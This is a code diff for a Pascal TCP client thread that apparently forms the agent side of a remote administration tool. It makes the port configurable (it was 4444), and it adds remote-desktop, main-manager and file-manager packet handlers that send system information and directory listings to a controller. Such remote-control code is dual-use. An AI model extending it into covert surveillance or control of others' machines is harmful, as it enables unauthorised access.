@@ -24,6 +24,7 @@ type
         procedure Execute; override;
     public
         IP : String;
+        Port : Integer;
         Active: Boolean;
         ThreadTerminated: Boolean;
         TCPClient : TIdTCPClient;
@@ -54,6 +55,7 @@ var
     jObject : TJSONObject;
     KernelName: UtsName;
     PC_info : string;
+    Files: TStringList;
 begin
     inherited;
     Connected := false;
@@ -70,7 +72,7 @@ begin
             begin
                 try
                     TCPClient.Host := Self.IP;
-                    TCPClient.Port := 4444;
+                    TCPClient.Port := Self.Port;
                    // TCPClient.IPVersion := Id_IPv4;
                     TCPClient.ConnectTimeout := 3000;
 
@@ -122,9 +124,8 @@ begin
                 begin
                     {Read Buffer}
                     Len := TCPClient.IOHandler.InputBuffer.Size;
-
                     {Write Buffer}
-                    if Len <> 0 then
+                    if (Len <> 0) and (Len > 10) then
                     begin
                         if ClientReceiveBuffer(TCPClient,Buf) then
                             writeln('Packet with len : ', Len , ' | ',TimeToStr(Now) );
@@ -133,17 +134,34 @@ begin
                         case packet.DataType of
                             H_RemoteDesktop:
                             begin
-                                writeln('Packet with type : H_RemoteDesktop  | ',TimeToStr(Now) );
+                                writeln('Get Packet with type : H_RemoteDesktop  | ',TimeToStr(Now) );
                                 outBuff := MainPacketToByteArray(packet);
                                 if ClientSendBuffer(TCPClient,outBuff) then
                                 WriteLn('Packet : H_RemoteDesktop - sent .. ');
                                 ClientSendString(TCPClient,PC_info);
                             end;
+                            H_MainManager:
+                            begin
+                                writeln('Get Packet with type : H_MainManager  | ',TimeToStr(Now) );
+                                outBuff := MainPacketToByteArray(packet);
+                                if ClientSendBuffer(TCPClient,outBuff) then
+                                    WriteLn('Packet : H_MainManager - sent .. ');
+                                ClientSendString(TCPClient,PC_info);
+                            end;
+                            H_FileManager:
+                            begin
+                                // Files := TStringList.Create();
+                                writeln('Get Packet with type : H_FileManager  | ',TimeToStr(Now) );
+                                Writeln ('Sending the CurrentDir : ',GetCurrentDir);
+                                Files := GetAllinDir(GetCurrentDir);
+                                //
+                            end;
+
                         end;
                     end;
 {==============================================================================}
 {==============================================================================}
-                    if TThread.GetTickCount64() > Lastping + 5000 then
+                    if TThread.GetTickCount64() > Lastping + 20000 then
                     begin
                         if PINGED = False then
                         begin
